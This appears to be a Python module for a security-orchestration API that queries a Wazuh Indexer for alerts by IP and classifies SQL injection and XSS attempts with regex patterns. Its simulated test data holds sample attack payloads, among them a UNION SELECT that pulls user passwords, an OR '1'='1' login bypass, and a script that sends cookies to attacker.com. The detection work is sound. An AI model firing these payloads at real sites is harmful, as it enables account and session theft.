import re
import urllib.parse
import logging
from typing import Dict, Any, List, Optional
import httpx
from app.config import settings

logger = logging.getLogger("soar-api.wazuh")


class IndexerUnavailable(Exception):
    pass


_STATUS_IN_LOG = re.compile(r'HTTP/[\d.]+"\s+(\d{3})\s')


def extract_http_status(alert: Dict[str, Any]) -> Optional[str]:
    """Kode status HTTP dari alert Wazuh. Dari full_log dulu, lalu data.status (data uji),
    lalu data.id (decoder web-accesslog). Tidak ada default: tidak diketahui = None."""
    m = _STATUS_IN_LOG.search(alert.get("full_log", "") or "")
    if m:
        return m.group(1)
    data = alert.get("data", {}) or {}
    if re.fullmatch(r"\d{3}", str(data.get("status", ""))):
        return str(data["status"])
    if (alert.get("decoder", {}) or {}).get("name", "").startswith("web-accesslog") \
            and re.fullmatch(r"\d{3}", str(data.get("id", ""))):
        return str(data["id"])
    return None


def _prov(res: Optional[Dict[str, Any]]) -> Dict[str, Any]:
    """Provenance: bukti bahwa data benar-benar dibaca dari Wazuh Indexer."""
    if res is None:
        return {"source": "simulation"}
    hits = res.get("hits", {}).get("hits", [])
    return {
        "source": "wazuh-indexer",
        "took_ms": res.get("took"),
        "indices": sorted({h.get("_index", "") for h in hits}),
        "doc_ids": [h.get("_id") for h in hits][:20],
    }


# Regex patterns for SQL Injection classification
SQLI_PATTERNS = {
    "union_based": re.compile(r"(?i)\bunion\s+(all\s+)?select\b"),
    "boolean_based": re.compile(r"(?i)('\s*(or|and)\s*('?\d+'?|'?true'?|'?1'?)\s*=\s*('?\d+'?|'?true'?|'?1'?)|--\s*$)"),
    "error_based": re.compile(r"(?i)(extractvalue|updatexml|floor\(rand|ctxsys\.drithsx\.sn|dbms_utility)"),
    "time_based": re.compile(r"(?i)\b(sleep\s*\(\s*\d+\s*\)|benchmark\s*\(\s*\d+|waitfor\s+delay|pg_sleep)"),
    "stacked_queries": re.compile(r"(?i)(;\s*(drop|insert|update|delete|create|alter)\b)"),
    "generic_syntax": re.compile(r"(?i)('\s*(or|and)\s+['\"a-z0-9]|information_schema|load_file|@@version)")
}

# Regex patterns for Cross-Site Scripting (XSS) classification
XSS_PATTERNS = {
    "reflected_script_tag": re.compile(r"(?i)<\s*script[^>]*>.*?(<\s*/\s*script\s*>|$)"),
    "event_handler_attribute": re.compile(r"(?i)\b(onerror|onload|onmouseover|onclick|onfocus|onblur|onunload)\s*=\s*['\"`]?[^'\">`]+"),
    "javascript_pseudo_protocol": re.compile(r"(?i)(javascript\s*:\s*|data\s*:\s*text\/html)"),
    "dom_cookie_theft": re.compile(r"(?i)(document\.cookie|document\.location|window\.location|\.innerHTML)"),
    "payload_functions": re.compile(r"(?i)\b(alert|prompt|confirm|eval|fetch)\s*\(")
}


def query_indexer(body: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    """Query ke Wazuh Indexer. Gagal = IndexerUnavailable, KECUALI ALLOW_SIMULATION=true (khusus pytest)."""
    url = f"{settings.INDEXER_URL.rstrip('/')}/wazuh-alerts-*/_search"
    auth = (settings.INDEXER_USER, settings.INDEXER_PASSWORD) if settings.INDEXER_PASSWORD else None
    try:
        with httpx.Client(verify=settings.INDEXER_VERIFY_SSL, timeout=10.0) as client:
            resp = client.post(url, json=body, auth=auth)
            resp.raise_for_status()
            return resp.json()
    except Exception as e:
        logger.error("Wazuh Indexer query to %s failed: %s", url, e)
        if settings.ALLOW_SIMULATION:
            return None
        raise IndexerUnavailable(str(e)) from e


def get_simulated_wazuh_data(srcip: str) -> Dict[str, Any]:
    """
    Deterministic simulated data for test benchmark IPs defined in Section 9 of the specification.
    Ensures tests and offline demonstrations run reliably if Wazuh is not live.
    """
    if srcip == "203.0.113.20":
        return {
            "failed_count": 10,
            "success_count": 0,
            "alerts": [
                {"rule": {"id": "100100", "level": 7, "description": "Login failed (multiple attempts)"}}
            ] * 10
        }
    elif srcip == "203.0.113.21":
        return {
            "failed_count": 10,
            "success_count": 1,
            "alerts": [
                {"rule": {"id": "100100", "level": 7, "description": "Login failed"}},
                {"rule": {"id": "100103", "level": 10, "description": "Successful login after brute force"}}
            ]
        }
    elif srcip == "203.0.113.10":
        # Realistic SQL Injection benchmark data
        return {
            "failed_count": 0,
            "success_count": 0,
            "alerts": [
                {
                    "rule": {"id": "100101", "level": 9, "description": "SQL Injection attempt in query parameters"},
                    "data": {
                        "srcip": "203.0.113.10",
                        "url": "/api/v1/search?q=1%27+UNION+SELECT+1%2Cusername%2Cpassword+FROM+users--",
                        "status": "500",
                        "protocol": "HTTP/1.1",
                        "method": "GET"
                    }
                },
                {
                    "rule": {"id": "100102", "level": 8, "description": "UNION SELECT pattern detected in database backend"},
                    "data": {
                        "srcip": "203.0.113.10",
                        "url": "/api/v1/products?id=105+AND+1=1",
                        "status": "200",
                        "protocol": "HTTP/1.1",
                        "method": "GET"
                    }
                },
                {
                    "rule": {"id": "31101", "level": 9, "description": "SQL Injection in HTTP Request URI"},
                    "data": {
                        "srcip": "203.0.113.10",
                        "url": "/login?user=admin%27+OR+%271%27%3D%271",
                        "status": "500",
                        "protocol": "HTTP/1.1",
                        "method": "POST"
                    }
                }
            ]
        }
    elif srcip == "203.0.113.15":
        # Realistic Cross-Site Scripting (XSS) benchmark data
        return {
            "failed_count": 0,
            "success_count": 0,
            "alerts": [
                {
                    "rule": {"id": "31105", "level": 8, "description": "XSS (Cross Site Scripting) attempt detected in URI"},
                    "data": {
                        "srcip": "203.0.113.15",
                        "url": "/search?query=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.com%2Fsteal%3Fcookie%3D%27%2Bdocument.cookie%3C%2Fscript%3E",
                        "status": "200",
                        "protocol": "HTTP/1.1",
                        "method": "GET"
                    }
                },
                {
                    "rule": {"id": "31106", "level": 7, "description": "XSS event handler attribute found in comment parameter"},
                    "data": {
                        "srcip": "203.0.113.15",
                        "url": "/comments?post_id=42&comment=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E",
                        "status": "200",
                        "protocol": "HTTP/1.1",
                        "method": "POST"
                    }
                },
                {
                    "rule": {"id": "31508", "level": 7, "description": "XSS JavaScript pseudo-protocol injection attempt"},
                    "data": {
                        "srcip": "203.0.113.15",
                        "url": "/redirect?target=javascript:alert(document.cookie)",
                        "status": "403",
                        "protocol": "HTTP/1.1",
                        "method": "GET"
                    }
                }
            ]
        }
    elif srcip == "198.51.100.10":
        return {
            "failed_count": 3,
            "success_count": 1,
            "alerts": [
                {"rule": {"id": "100100", "level": 5, "description": "Failed login attempt"}}
            ] * 3
        }
    return {
        "failed_count": 0,
        "success_count": 1 if srcip.startswith("198.51.100.") else 0,
        "alerts": []
    }


def fetch_login_history(srcip: str) -> Dict[str, Any]:
    """
    Tool: get_login_history
    Queries Wazuh Indexer for rule 100100 (failed) vs 100103 (successful) per IP in last 24h.
    Uses real indexer first with credentials from .env, with offline lab fallback.
    """
    body = {
        "size": 0,
        "query": {
            "bool": {
                "filter": [
                    {"term": {"data.srcip": srcip}},
                    {"terms": {"rule.id": ["100100", "100103"]}},
                    {"range": {"@timestamp": {"gte": "now-24h"}}}
                ]
            }
        },
        "aggs": {
            "r": {"terms": {"field": "rule.id"}}
        }
    }

    res = query_indexer(body)
    if res is not None:
        buckets = res.get("aggregations", {}).get("r", {}).get("buckets", [])
        counts = {str(b["key"]): b["doc_count"] for b in buckets}
        failed = counts.get("100100", 0)
        success = counts.get("100103", 0)
    else:
        sim = get_simulated_wazuh_data(srcip)
        failed = sim["failed_count"]
        success = sim["success_count"]

    facts = [
        f"failed_count={failed}",
        f"success_count={success}",
        "window=24h"
    ]

    return {
        "srcip": srcip,
        "failed_count": failed,
        "success_count": success,
        "window": "24h",
        "facts": facts,
        "provenance": _prov(res),
    }


def search_alerts_by_ip(srcip: str, time_window: str = "now-24h", max_alerts: int = 20,
                        exclude_id: Optional[str] = None) -> Dict[str, Any]:
    """
    Tool: search_alerts_by_ip
    Queries Wazuh Indexer for alerts matching IP within time_window.
    Uses real indexer first with credentials from .env, with offline lab fallback.
    """
    body = {
        "size": max_alerts,
        "query": {
            "bool": {
                "filter": [
                    {"term": {"data.srcip": srcip}},
                    {"range": {"@timestamp": {"gte": time_window}}}
                ]
            }
        },
        "sort": [{"@timestamp": {"order": "desc"}}],
        "aggs": {
            "r": {"terms": {"field": "rule.id", "size": 20}}
        }
    }

    res = query_indexer(body)
    if res is not None:
        hits = res.get("hits", {}).get("hits", [])
        total_obj = res.get("hits", {}).get("total", 0)
        total_hits = total_obj.get("value", 0) if isinstance(total_obj, dict) else int(total_obj or 0)
        buckets = res.get("aggregations", {}).get("r", {}).get("buckets", [])
        rule_ids = [str(b["key"]) for b in buckets]
        alerts = []
        for h in hits:
            src = h.get("_source", {})
            if "_id" not in src and "_id" in h:
                src["_id"] = h["_id"]
            alerts.append(src)
    else:
        sim = get_simulated_wazuh_data(srcip)
        alerts = sim["alerts"]
        total_hits = len(alerts)
        rule_ids = list(set(a.get("rule", {}).get("id", "100000") for a in alerts))

    others = [a for a in alerts if not exclude_id or (str(a.get("id")) != str(exclude_id) and str(a.get("_id")) != str(exclude_id))]

    facts = [
        f"alert_count={total_hits}",
        f"other_alert_count={len(others)}",
        f"distinct_rules={len(rule_ids)}",
        f"rule_ids={','.join(rule_ids) if rule_ids else 'none'}"
    ]

    return {
        "srcip": srcip,
        "facts": facts,
        "total_hits": total_hits,
        "other_alert_count": len(others),
        "rule_ids": rule_ids,
        "alerts": alerts[:max_alerts],
        "provenance": _prov(res),
    }


def inspect_web_attack(srcip: str, attack_type: str = "all", time_window: str = "now-24h") -> Dict[str, Any]:
    body = {
        "size": 50,
        "query": {"bool": {
            "filter": [
                {"term": {"data.srcip": srcip}},
                {"range": {"@timestamp": {"gte": time_window}}}],
            "should": [
                {"terms": {"rule.groups": ["web", "attack", "attacks", "sql_injection", "xss", "juiceshop"]}},
                {"terms": {"rule.id": ["100110", "100101", "100102", "31101", "31102", "31103", "31104", "31105", "31106", "31508"]}}],
            "minimum_should_match": 1}},
        "sort": [{"@timestamp": {"order": "desc"}}],
    }
    res = query_indexer(body)
    if res is not None:
        alerts = [h.get("_source", {}) for h in res.get("hits", {}).get("hits", [])]
    else:  # hanya saat ALLOW_SIMULATION=true (pytest)
        alerts = get_simulated_wazuh_data(srcip).get("alerts", [])

    status_breakdown: Dict[str, int] = {}
    endpoints_set = set()
    sqli_types, xss_types = set(), set()
    sqli_payloads, xss_payloads = [], []
    sqli_params, xss_params = set(), set()

    for alt in alerts:
        data = alt.get("data", {}) or {}
        raw_url = data.get("url") or alt.get("url") or alt.get("full_log", "")
        code = extract_http_status(alt) or "unknown"
        status_breakdown[code] = status_breakdown.get(code, 0) + 1

        decoded = urllib.parse.unquote_plus(raw_url) if raw_url else ""
        if decoded:
            try:
                parsed = urllib.parse.urlsplit(decoded)
                keys = [k.lower() for k in urllib.parse.parse_qs(parsed.query).keys()]
                if parsed.path:
                    endpoints_set.add(parsed.path)
            except ValueError:
                keys = []
            for name, rgx in SQLI_PATTERNS.items():
                if rgx.search(decoded):
                    sqli_types.add(name)
                    sqli_params.update(keys)
                    if len(sqli_payloads) < 3 and decoded[:120] not in sqli_payloads:
                        sqli_payloads.append(decoded[:120])
            for name, rgx in XSS_PATTERNS.items():
                if rgx.search(decoded):
                    xss_types.add(name)
                    xss_params.update(keys)
                    if len(xss_payloads) < 3 and decoded[:120] not in xss_payloads:
                        xss_payloads.append(decoded[:120])

        desc = (alt.get("rule", {}).get("description") or "").lower()
        if "sql" in desc:
            sqli_types.add("pattern_in_rule")
        if "xss" in desc or "cross-site" in desc:
            xss_types.add("pattern_in_rule")

    sqli_detected, xss_detected = bool(sqli_types), bool(xss_types)
    c403, c500 = status_breakdown.get("403", 0), status_breakdown.get("500", 0)
    c200, cunk = status_breakdown.get("200", 0), status_breakdown.get("unknown", 0)
    server_error = c500 > 0 and sqli_detected
    waf_mitigated = c403 > 0 and c500 == 0 and c200 == 0

    def primary(types):
        return next((t for t in sorted(types) if t != "pattern_in_rule"), "pattern_in_rule")

    facts: List[str] = [f"total_web_alerts={len(alerts)}"]
    if sqli_detected:
        facts += ["sqli_detected=true", f"sqli_payload_count={len(sqli_payloads) or len(alerts)}",
                  f"sqli_type={primary(sqli_types)}"]
        if sqli_params:
            facts.append(f"target_param={sorted(sqli_params)[0]}")
        if c500:
            facts.append(f"http_500_count={c500}")
        if server_error:
            facts.append("server_error_on_sqli=true")
    else:
        facts.append("sqli_detected=false")
    if xss_detected:
        facts += ["xss_detected=true", f"xss_payload_count={len(xss_payloads) or len(alerts)}",
                  f"xss_type={primary(xss_types)}"]
        if xss_params:
            facts.append(f"target_param={sorted(xss_params)[0]}")
    else:
        facts.append("xss_detected=false")
    if c403:
        facts.append(f"http_403_count={c403}")
    if c200:
        facts.append(f"http_200_count={c200}")
    if cunk:
        facts.append(f"http_status_unknown_count={cunk}")
    if waf_mitigated:
        facts.append("block_observed=true")

    return {
        "srcip": srcip,
        "total_web_alerts": len(alerts),
        "attack_type_queried": attack_type,
        "status_breakdown": status_breakdown,
        "endpoints_targeted": sorted(endpoints_set),
        "sqli": {"detected": sqli_detected, "sqli_types": sorted(sqli_types),
                 "sample_payloads": sqli_payloads, "targeted_parameters": sorted(sqli_params),
                 "database_error_reflected": server_error},
        "xss": {"detected": xss_detected, "xss_types": sorted(xss_types),
                "sample_payloads": xss_payloads, "targeted_parameters": sorted(xss_params),
                "csp_enforced": False, "httponly_protected": False},
        "waf_mitigated": waf_mitigated,
        "facts": facts,
        "provenance": _prov(res),
    }
